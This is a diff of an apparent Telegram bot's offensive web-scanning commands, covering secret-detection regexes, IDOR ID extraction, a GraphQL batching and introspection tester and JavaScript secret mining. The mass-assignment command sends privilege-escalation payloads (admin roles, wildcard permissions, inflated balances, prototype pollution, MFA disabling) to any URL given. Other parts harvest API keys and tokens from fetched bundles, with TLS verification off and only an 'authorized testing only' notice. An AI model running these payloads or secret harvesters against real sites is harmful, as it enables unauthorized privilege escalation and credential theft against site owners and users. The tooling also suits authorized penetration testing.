-    "Generic API Key":       (r'(?i)(?:api[_\-]?key|apikey|api[_\-]?secret)[\s]*[=:][\s]*[\x27"]?([A-Za-z0-9\-_]{20,})', "MEDIUM"),
-    "Generic Secret":        (r'(?i)(?:secret|password|passwd|pwd)[\s]*[=:][\s]*[\x27"]([^\x27",\\s]{8,})', "MEDIUM"),
+    "Generic API Key":       (r'(?i)(?:api[_\-]?key|apikey|api[_\-]?secret)[\s]*[=:][\s]*[\'"]?([A-Za-z0-9\-_]{20,})', "MEDIUM"),
+    "Generic Secret":        (r'(?i)(?:secret|password|passwd|pwd)[\s]*[=:][\s]*[\'"]([^\'",\s]{8,})', "MEDIUM"),
     "Bearer Token":          (r'(?i)bearer\s+([A-Za-z0-9\-_=.+/]{20,})', "MEDIUM"),
     "Firebase URL":          (r'https://[a-z0-9\-]+\.firebaseio\.com', "MEDIUM"),
     "Heroku API Key":        (r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', "MEDIUM"),
@@ -18060,8 +17809,8 @@ _SECRET_REGEX_MAP = {
     "Discord Bot Token":     (r'[MN][A-Za-z0-9]{23}\.[A-Za-z0-9\-_]{6}\.[A-Za-z0-9\-_]{27}', "HIGH"),
     "OpenAI API Key":        (r'sk-[A-Za-z0-9]{48}', "CRITICAL"),
     "Anthropic API Key":     (r'sk-ant-[A-Za-z0-9\-_]{95}', "CRITICAL"),
-    "Cloudflare API Key":    (r'(?i)cloudflare.{0,20}[=:][\s]*[\x27"]?([a-zA-Z0-9_\-]{37})', "HIGH"),
-    "Database URL":          (r'(?i)(?:mysql|postgres|mongodb|redis|sqlite)://[^\\s\x27"<>]{10,}', "HIGH"),
+    "Cloudflare API Key":    (r'(?i)cloudflare.{0,20}[=:][\s]*[\'"]?([a-zA-Z0-9_\-]{37})', "HIGH"),
+    "Database URL":          (r'(?i)(?:mysql|postgres|mongodb|redis|sqlite)://[^\s\'"<>]{10,}', "HIGH"),
 }
 
 def _secretscan_sync(url: str, progress_q: list) -> dict:
@@ -21234,42 +20983,22 @@ async def cmd_idor_uuid_leak(update: Update, context: ContextTypes.DEFAULT_TYPE)
             async with session.get(url, headers=_get_headers(), ssl=False) as r:
                 headers_str = str(r.headers)
         patterns = {
-            "UUID v4":        r'[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
-            "UUID v1":        r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
-            "UUID v5":        r'[0-9a-f]{8}-[0-9a-f]{4}-5[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
-            "Firebase ID":    r'-[A-Za-z0-9_-]{19}',
-            "MongoDB ObjID":  r'\b[0-9a-f]{24}\b',
-            "Generic ID":     r'["\x27"](user|account|order|id|uid|uuid)["\x27"]\s*[:=]\s*["\x27"]([a-zA-Z0-9_-]{16,64})["\x27"]',
-            "Numeric ID":     r'(?:user_id|account_id|order_id|item_id|product_id|customer_id)\s*[:=]\s*(\d{4,12})',
-            "Snowflake ID":   r'\b[0-9]{17,20}\b',
-            "AWS Resource":   r'arn:aws:[a-z0-9\-]+:[a-z0-9\-]*:\d{12}:[^\\s"\x27]<>]{3,100}',
-            "JWT Payload":    r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',
-            "Session Token":  r'(?:session|sess)[_-]?(?:id|token)\s*[:=]\s*["\x27"]?([a-zA-Z0-9_\-]{20,80})',
-            "API Key Leak":   r'(?:api[_-]?key|token)\s*[:=]\s*["\x27"]([a-zA-Z0-9_\-]{20,64})["\x27"]',
-            "ULID":           r'\b[0-9A-Z]{26}\b',
-            "NanoID":         r'\b[A-Za-z0-9_\-]{21}\b',
+            "UUID v4":    r'[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
+            "Firebase":   r'-[A-Za-z0-9_-]{19}',
+            "Generic ID": r'["\'](?>user|account|order|id|uid|uuid)["\']\s*[:=]\s*["\']([a-zA-Z0-9_-]{16,64})["\']',
+            "MongoDB":    r'[0-9a-f]{24}',
         }
         found_all = {}
         for name, pat in patterns.items():
             matches = set(re.findall(pat, text + headers_str, re.I))
-            # Flatten tuples from groups
-            flat = set()
-            for m in matches:
-                flat.add(m[-1] if isinstance(m, tuple) else m)
-            if flat:
-                found_all[name] = flat
+            if matches: found_all[name] = matches
         if found_all:
-            res = [f"📄 *Extracted Resource IDs — `{urlparse(url).hostname}`*\n"]
-            total_count = sum(len(v) for v in found_all.values())
-            res.append(f"🔢 Total unique IDs: `{total_count}`\n")
+            res = ["📄 *Extracted Resource IDs:*"]
             for name, matches in found_all.items():
-                res.append(f"\n🔹 *{name}* ({len(matches)} found):")
-                for m in sorted(matches)[:15]:
-                    res.append(f"  • `{str(m)[:80]}`")
-                if len(matches) > 15:
-                    res.append(f"  _...and {len(matches)-15} more_")
-            res.append(f"\n💡 *IDOR Test:* Try IDs in `/api/user/<ID>`, `/api/order/<ID>`, `/api/account/<ID>` for authorization bypass.")
-            res.append("⚠️ _Authorized testing only._")
+                res.append(f"\n🔹 *{name}* ({len(matches)}):")
+                for m in list(matches)[:5]:
+                    res.append(f"  • `{str(m)[:60]}`")
+            res.append("\n💡 Test IDs in `/api/user/<ID>` for IDOR bypass.")
             await msg.edit_text("\n".join(res), parse_mode='Markdown')
         else:
             await msg.edit_text("✅ *No resource IDs found.*", parse_mode='Markdown')
@@ -21294,80 +21023,30 @@ async def cmd_api_mass_assign(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.effective_message.reply_text(f"❌ *Blocked:* {reason}", parse_mode='Markdown'); return
     msg = await update.effective_message.reply_text("🚀 *Mass Assignment Test*\n\n⏳ Injecting admin attributes...", parse_mode='Markdown')
     payloads = [
-        # Role escalation
-        {"role": "admin", "isAdmin": True, "is_admin": 1, "group": "superusers", "admin": True},
-        {"role": "superadmin", "isOwner": True, "isSuperAdmin": True, "is_superadmin": 1},
-        {"role": "root", "is_root": True, "is_staff": True, "is_superuser": True},
-        # Permission escalation
-        {"permissions": ["*"], "privileges": "all", "access_level": 99, "scope": "admin"},
-        {"permissions": ["read", "write", "delete", "admin"], "can_delete": True, "can_manage": True},
-        {"access": "full", "level": "superadmin", "tier": "enterprise", "plan": "unlimited"},
-        # Financial escalation
-        {"account_type": "premium", "verified": True, "balance": 999999, "credits": 999999},
-        {"subscription": "enterprise", "trial": False, "paid": True, "quota": -1},
-        {"wallet": {"balance": 99999}, "points": 999999, "coins": 999999},
-        # Status / verification bypass
-        {"email_verified": True, "phone_verified": True, "kyc_status": "approved", "identity_verified": True},
-        {"banned": False, "active": True, "status": "active", "enabled": True, "locked": False},
-        {"two_factor_enabled": False, "mfa_required": False, "require_password_change": False},
-        # Internal field injection
-        {"__proto__": {"isAdmin": True}, "constructor": {"prototype": {"isAdmin": True}}},
-        {"_isAdmin": True, "_role": "admin", "__admin": True, "internal_role": "ADMIN"},
+        {"role": "admin", "isAdmin": True, "is_admin": 1, "group": "superusers"},
+        {"permissions": ["*"], "privileges": "all", "access_level": 99},
+        {"account_type": "premium", "verified": True, "balance": 999999},
     ]
     findings = []
     try:
-        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
-            for p_idx, p in enumerate(payloads):
-                for method_fn, method_name in [(session.put, "PUT"), (session.patch, "PATCH"), (session.post, "POST")]:
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
+            for p in payloads:
+                for method_fn, method_name in [(session.put, "PUT"), (session.patch, "PATCH")]:
                     try:
-                        async with method_fn(url, json=p, headers={**_get_headers(), "Content-Type": "application/json"}, ssl=False) as r:
+                        async with method_fn(url, json=p, headers=_get_headers(), ssl=False) as r:
                             if r.status in (200, 201, 204):
-                                try:
-                                    res_body = await r.text()
-                                except Exception:
-                                    res_body = ""
-                                # Check reflected keys
-                                reflected = [k for k in p.keys() if f'"{k}"' in res_body or f"'{k}'" in res_body]
-                                # Check value changes
-                                value_confirmed = []
-                                for k, v in p.items():
-                                    if isinstance(v, (bool, int, str)) and str(v).lower() in res_body.lower():
-                                        value_confirmed.append(f"{k}={v}")
+                                res_body = await r.text()
+                                reflected = [k for k in p.keys() if f'"{k}"' in res_body]
                                 if reflected:
-                                    findings.append(
-                                        f"🔴 *VULNERABLE ({method_name} payload #{p_idx+1}):*\n"
-                                        f"   Reflected keys: `{reflected[:5]}`\n"
-                                        f"   Confirmed: `{value_confirmed[:3]}`"
-                                    )
-                                elif r.status in (200, 201) and res_body and len(res_body) > 5:
-                                    # Heuristic: any successful mutation
-                                    findings.append(
-                                        f"🟠 *POSSIBLE ({method_name} payload #{p_idx+1}):*\n"
-                                        f"   Status `{r.status}` accepted — manual verify needed"
-                                    )
+                                    findings.append(f"🔴 *VULNERABLE ({method_name}):* Reflected: `{reflected}`")
                     except Exception:
                         pass
     except Exception as e:
         await msg.edit_text(f"❌ *Failed:* `{str(e)[:100]}`", parse_mode='Markdown'); return
     if findings:
-        result_lines = [
-            f"🔥 *Mass Assignment Findings — `{urlparse(url).hostname}`*\n",
-            f"Total: `{len(findings)}` issues found\n"
-        ]
-        result_lines.extend(findings[:10])
-        if len(findings) > 10:
-            result_lines.append(f"\n_...and {len(findings)-10} more_")
-        result_lines.append("\n💡 _These fields may allow privilege escalation or unauthorized attribute modification._")
-        result_lines.append("⚠️ _Authorized testing only._")
-        await msg.edit_text("\n".join(result_lines), parse_mode='Markdown')
+        await msg.edit_text("🔥 *Mass Assignment Findings:*\n\n" + "\n".join(findings), parse_mode='Markdown')
     else:
-        await msg.edit_text(
-            f"✅ *No Mass Assignment Vulnerability Detected*\n\n"
-            f"🌐 `{url[:80]}`\n"
-            f"🧪 Payloads tested: `{len(payloads)}`\n"
-            f"🔧 Methods: PUT, PATCH, POST",
-            parse_mode='Markdown'
-        )
+        await msg.edit_text("✅ *No Mass Assignment detected.*", parse_mode='Markdown')
 
 
 async def cmd_graphql_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -21383,68 +21062,19 @@ async def cmd_graphql_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
     safe, reason = is_safe_url(url)
     if not safe:
         await update.effective_message.reply_text(f"❌ *Blocked:* {reason}", parse_mode='Markdown'); return
-    msg = await update.effective_message.reply_text("🚀 *GraphQL Batching Test*\n\n⏳ Sending 100 queries + introspection...", parse_mode='Markdown')
+    msg = await update.effective_message.reply_text("🚀 *GraphQL Batching Test*\n\n⏳ Sending 100 queries...", parse_mode='Markdown')
     batch_query = [{"query": "query { __typename }"} for _ in range(100)]
-    findings = []
     try:
-        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=20)) as session:
-            # Test 1: Batch DoS
-            async with session.post(url, json=batch_query, headers={**_get_headers(), "Content-Type": "application/json"}, ssl=False) as r:
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
+            async with session.post(url, json=batch_query, headers=_get_headers(), ssl=False) as r:
                 if r.status == 200:
-                    try:
-                        data = await r.json(content_type=None)
-                        if isinstance(data, list) and len(data) >= 50:
-                            findings.append(f"🔴 *Batch DoS:* `{len(data)}` queries processed in one request\n   💡 Rate-limit bypass / CPU exhaustion possible")
-                    except Exception:
-                        pass
-
-            # Test 2: Introspection (information disclosure)
-            introspect = {"query": "{ __schema { types { name kind fields { name type { name kind } } } } }"}
-            async with session.post(url, json=introspect, headers={**_get_headers(), "Content-Type": "application/json"}, ssl=False) as r2:
-                if r2.status == 200:
-                    try:
-                        idata = await r2.json(content_type=None)
-                        if idata.get("data", {}).get("__schema"):
-                            types = idata["data"]["__schema"].get("types", [])
-                            user_types = [t["name"] for t in types if not t["name"].startswith("__")][:20]
-                            findings.append(f"🔴 *Introspection ENABLED:* `{len(user_types)}` types exposed\n   Types: `{'`, `'.join(user_types[:8])}`\n   💡 Full schema enumeration possible")
-                    except Exception:
-                        pass
-
-            # Test 3: Deep query (alias amplification)
-            deep_query = {"query": "{ " + " ".join([f"q{i}: __typename" for i in range(50)]) + " }"}
-            async with session.post(url, json=deep_query, headers={**_get_headers(), "Content-Type": "application/json"}, ssl=False) as r3:
-                if r3.status == 200:
-                    try:
-                        ddata = await r3.json(content_type=None)
-                        if ddata.get("data") and len(ddata["data"]) >= 40:
-                            findings.append(f"🟠 *Alias Amplification:* `{len(ddata['data'])}` aliases returned\n   💡 Response amplification possible")
-                    except Exception:
-                        pass
-
-            # Test 4: Field suggestion (engine leak)
-            typo_query = {"query": "{ usr { id } }"}
-            async with session.post(url, json=typo_query, headers={**_get_headers(), "Content-Type": "application/json"}, ssl=False) as r4:
-                if r4.status == 200:
-                    try:
-                        body4 = await r4.text()
-                        if "Did you mean" in body4 or "suggestion" in body4.lower():
-                            findings.append("🟡 *Field Suggestion Leak:* Engine reveals valid field names via error messages")
-                    except Exception:
-                        pass
-
-        if findings:
-            result = [f"🔥 *GraphQL Vulnerabilities — `{urlparse(url).hostname}`*\n"]
-            result.extend(findings)
-            result.append("\n⚠️ _Authorized testing only._")
-            await msg.edit_text("\n\n".join(result), parse_mode='Markdown')
-        else:
-            await msg.edit_text(
-                f"✅ *GraphQL: No Critical Issues Found*\n\n"
-                f"🌐 `{url[:60]}`\n"
-                f"🔒 Batching, introspection, alias amp — all tested",
-                parse_mode='Markdown'
-            )
+                    data = await r.json(content_type=None)
+                    if isinstance(data, list) and len(data) == 100:
+                        await msg.edit_text(
+                            "🔴 *VULNERABLE:* 100 batched queries processed.\n\n💡 Rate-limit bypass / DoS possible.",
+                            parse_mode='Markdown')
+                        return
+                await msg.edit_text(f"✅ *Not Vulnerable:* Server returned `{r.status}`.", parse_mode='Markdown')
     except Exception as e:
         await msg.edit_text(f"❌ *Failed:* `{str(e)[:100]}`", parse_mode='Markdown')
 
@@ -21467,103 +21097,19 @@ async def cmd_js_restore(update: Update, context: ContextTypes.DEFAULT_TYPE):
     _active_scans.set(uid, "JS Restore")
     msg = await update.effective_message.reply_text("🚀 *JS Secret Mining*\n\n⏳ Analyzing bundle...", parse_mode='Markdown')
     try:
-        # ── Phase 1: Fetch the target (HTML or direct JS) ──────────
-        main_content = await get_rendered_html(url)
-        all_js_sources = {"[target]": main_content}
-
-        # ── Phase 2: If HTML, discover & download all JS bundles ──
-        if url.endswith('.html') or '<html' in main_content[:500].lower() or '<!doctype' in main_content[:200].lower():
-            await msg.edit_text("🚀 *JS Secret Mining*\n\n🔍 HTML detected — discovering JS bundles...", parse_mode='Markdown')
-            soup_js = BeautifulSoup(main_content, 'html.parser')
-            root_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
-            js_urls_found = []
-            for tag in soup_js.find_all('script', src=True):
-                src = tag.get('src', '')
-                if not src: continue
-                if src.startswith('//'):   src = 'https:' + src
-                elif src.startswith('/'): src = root_url + src
-                if src.startswith('http'): js_urls_found.append(src)
-            # Also check for inline scripts
-            inline_idx = 0
-            for tag in soup_js.find_all('script', src=False):
-                if tag.string and len(tag.string.strip()) > 50:
-                    all_js_sources[f"[inline_{inline_idx}]"] = tag.string
-                    inline_idx += 1
-
-            # Download external JS files (up to 20)
-            def _fetch_js(js_url):
-                try:
-                    r = requests.get(js_url, headers=_get_headers(), timeout=12, verify=False)
-                    if r.status_code == 200 and len(r.text) > 50:
-                        return js_url, r.text
-                except Exception:
-                    pass
-                return js_url, None
-
-            if js_urls_found:
-                await msg.edit_text(
-                    f"🚀 *JS Secret Mining*\n\n"
-                    f"📦 Found `{len(js_urls_found)}` JS bundles\n"
-                    f"⬇️ Downloading & analyzing...",
-                    parse_mode='Markdown'
-                )
-                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
-                    futs = {ex.submit(_fetch_js, u): u for u in js_urls_found[:20]}
-                    for fut in concurrent.futures.as_completed(futs, timeout=45):
-                        try:
-                            js_url_k, js_content_v = fut.result(timeout=8)
-                            if js_content_v:
-                                fname = js_url_k.split('/')[-1][:40] or js_url_k[-30:]
-                                all_js_sources[fname] = js_content_v
-                        except Exception:
-                            pass
-
-        # ── Phase 3: Scan ALL collected sources for secrets ────────
+        js_content = await get_rendered_html(url)
         secrets = []
-        source_hits = {}
-        for src_name, src_content in all_js_sources.items():
-            src_secrets = []
-            for pat, label in _ANALYZE_SECRET_PATTERNS:
-                for m in set(re.findall(pat, src_content)):
-                    val = m[-1] if isinstance(m, tuple) else m
-                    if len(val) < 6: continue
-                    masked = (val[:8] + "···" + val[-4:] if len(val) > 12 else val).replace("`", "'")
-                    entry = f"{label}: `{masked}`"
-                    src_secrets.append(entry)
-                    secrets.append(entry)
-            if src_secrets:
-                source_hits[src_name] = list(set(src_secrets))
-
-        unique_secrets = list(dict.fromkeys(secrets))  # preserve order, deduplicate
-        if unique_secrets:
-            report_lines = [
-                f"🔥 *JS Secret Mining Results*\n",
-                f"🌐 Target: `{url[:60]}`",
-                f"📦 Sources scanned: `{len(all_js_sources)}`",
-                f"🔑 Total secrets found: `{len(unique_secrets)}`\n",
-            ]
-            # Per-source breakdown
-            if len(source_hits) > 1:
-                report_lines.append("*📂 By Source:*")
-                for src_n, src_s in list(source_hits.items())[:10]:
-                    short_name = src_n[:35] if len(src_n) > 35 else src_n
-                    report_lines.append(f"  `{short_name}` — `{len(src_s)}` secrets")
-                report_lines.append("")
-            report_lines.append("*🔑 All Secrets:*")
-            for s in unique_secrets[:80]:
-                report_lines.append(f"  • {s}")
-            if len(unique_secrets) > 80:
-                report_lines.append(f"\n_...and {len(unique_secrets)-80} more_")
-            report_lines.append("\n⚠️ _Authorized testing only._")
-            await msg.edit_text("\n".join(report_lines), parse_mode='Markdown')
+        for pat, label in _ANALYZE_SECRET_PATTERNS:
+            for m in set(re.findall(pat, js_content)):
+                masked = (m[:6] + "···" + m[-4:] if len(m) > 10 else m).replace("`", "'")
+                secrets.append(f"{label}: `{masked}`")
+        if secrets:
+            report = "🔥 *Secrets Found:*\n\n" + "\n".join(list(set(secrets))[:25])
+            if len(secrets) > 25:
+                report += f"\n\n_...and {len(secrets)-25} more_"
+            await msg.edit_text(report, parse_mode='Markdown')
         else:
-            await msg.edit_text(
-                f"✅ *No Secrets Found*\n\n"
-                f"🌐 `{url[:60]}`\n"
-                f"📦 Sources scanned: `{len(all_js_sources)}`\n"
-                f"🔍 Patterns checked: `{len(_ANALYZE_SECRET_PATTERNS)}`",
-                parse_mode='Markdown'
-            )
+            await msg.edit_text("✅ *No secrets found.*", parse_mode='Markdown')
     except Exception as e:
         await msg.edit_text(f"❌ *Failed:* `{str(e)[:100]}`", parse_mode='Markdown')
     finally:
